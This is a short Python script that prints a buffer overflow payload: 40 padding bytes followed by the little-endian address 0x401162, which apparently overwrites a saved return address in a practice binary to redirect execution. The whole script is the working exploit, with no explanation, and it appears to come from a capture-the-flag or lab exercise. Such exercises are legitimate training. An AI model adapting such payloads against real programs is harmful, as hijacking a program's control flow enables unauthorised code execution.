import sys

#0x401162
pad = 40 * b'\x11' + b'\x62\x11\x40\x00\x00\x00\x00\x00'

sys.stdout.buffer.write(pad)
